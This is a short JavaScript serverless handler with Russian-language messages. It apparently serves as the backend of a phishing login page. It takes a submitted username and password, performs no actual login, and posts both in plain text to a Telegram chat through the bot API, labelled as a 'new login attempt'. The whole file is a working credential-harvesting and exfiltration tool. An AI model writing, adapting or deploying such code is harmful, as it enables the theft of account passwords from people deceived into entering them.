export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Метод не разрешен' });
    }

    try {
        const { username, password } = req.body;

        const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            console.error('Отсутствуют переменные окружения Telegram');
            return res.status(500).json({ error: 'Ошибка конфигурации сервера' });
        }

        const message = `🔔 Новая попытка входа!\n👤 Ник: ${username}\n🔑 Пароль: ${password}`;
        
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });

        const data = await response.json();

        if (data.ok) {
            res.status(200).json({ success: true });
        } else {
            console.error('Ошибка Telegram:', data);
            res.status(500).json({ error: 'Ошибка отправки в Telegram' });
        }
    } catch (error) {
        console.error('Ошибка сервера:', error);
        res.status(500).json({ error: 'Внутренняя ошибка сервера' });
    }
}
